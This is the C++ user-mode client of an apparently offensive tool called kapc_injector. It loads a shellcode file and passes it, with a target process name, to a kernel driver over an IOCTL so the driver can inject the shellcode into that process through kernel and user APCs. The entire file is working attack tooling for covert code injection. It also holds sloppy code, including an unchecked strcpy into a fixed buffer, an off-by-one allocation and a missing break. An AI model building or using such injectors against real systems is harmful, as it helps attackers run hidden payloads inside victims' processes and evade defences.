#include <Windows.h>
#include <winioctl.h>
#include <stdio.h>
#include "logger.h"
#define KAPC_INJECTOR_IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x601, METHOD_NEITHER,FILE_READ_DATA | FILE_WRITE_DATA)
typedef struct kapc_mem {
	char process_name[20];
	unsigned char *shellcode;
	SIZE_T shellcode_size;
}kapc_mem, * pkapc_mem;

enum kapc_injector_result {

	kapc_injection_result_success = 0,
	kapc_kernel_queue_failed = -1,
	kapc_user_queue_failed = -2,
	kapc_allocation_failed = -3,
	kapc_create_thread_notify_failed = -4,
	kapc_failed_device_creation = -5,
	kapc_failed_symbolic_link = -6,
	kapc_failed_attach_process = -7



};
typedef struct result {
	kapc_injector_result k_result;
}result, * p_result;


PVOID read_shellcode(char* path,PULONG shellcode_size) {
	HANDLE hfile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD len = GetFileSize(hfile, 0);
	PVOID shellcode = malloc(len + 1);
	ZeroMemory(shellcode, len + 1);
	DWORD read = 0;
	ReadFile(hfile, shellcode, len, &read, 0);
	CloseHandle(hfile);
	*shellcode_size = len;

	return shellcode;
}

int main(int argc, char* argv[]) {
	ULONG shellcode_size = 0;
	char* process = argv[2];
	char* shellcode_path = argv[1];
	Logger* log = new Logger("kapc_injector with <3 by @veil_ivy\r\n");
	PVOID shellcode = read_shellcode(argv[1], &shellcode_size);
	if (shellcode == NULL) {
		log->Info("failed to get shellcode\r\n");
		ExitProcess(0);
	}
	
	log->Info("process :%s shellcode path %s", process, shellcode_path);
	log->Usage("usage: kapc_injector.exe [shellcode_bin] [process_name] \r\n-shellcode_bin: shellcode file path\r\n process_name:name of the proces to inject the shellcode");
	HANDLE hfile = CreateFile(L"\\\\.\\kapc_injector", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	kapc_mem xapc_mem = { 0 };
	DWORD bytes_ret = 0;
	strcpy(xapc_mem.process_name, process);
	xapc_mem.shellcode = (unsigned char *)malloc(shellcode_size) + 1;
	ZeroMemory((char*)xapc_mem.shellcode, shellcode_size + 1);
	memcpy((char*)xapc_mem.shellcode, (char*)shellcode,shellcode_size);
	xapc_mem.shellcode_size = shellcode_size;
	LPVOID ret_buffer = (LPVOID)malloc(sizeof(result));
	ZeroMemory(ret_buffer, sizeof(result));
	
	if (hfile) {
		log->Info("sending IOCTL to driver\n", NULL);
		if (!DeviceIoControl(hfile, KAPC_INJECTOR_IOCTL, &xapc_mem, sizeof(xapc_mem), ret_buffer, sizeof(result), &bytes_ret, 0)) {
			log->Error("failed to send IOCTL\r\n driver may not be loaded\r\n");
		}
		else {
			p_result xresult = (p_result)ret_buffer;
			switch (xresult->k_result) {
			case kapc_injection_result_success:
				log->Info("injection successful\r\n injected into process :%s\r\n", xapc_mem.process_name);
				break;
			case kapc_kernel_queue_failed:
				log->Error("failed to insert kernel APC\r\n");
				break;
			case kapc_user_queue_failed:
				log->Error("failed to insert APC for usermode shellcode\r\n");
			case kapc_allocation_failed:
				log->Error("failed to allocate memory for shellcode\r\n");
				break;
			case kapc_create_thread_notify_failed:
				log->Error("failed to start PsSetCreateThreadNotifyRoutine\r\n");
				break;
			case kapc_failed_attach_process:
				log->Error("failed to attach to targeted process\r\n");
				break;
			default:
				log->Warning("unknown error code\r\n");
				break;
			}

			
		}
	}
	free(xapc_mem.shellcode);
	free(ret_buffer);

}
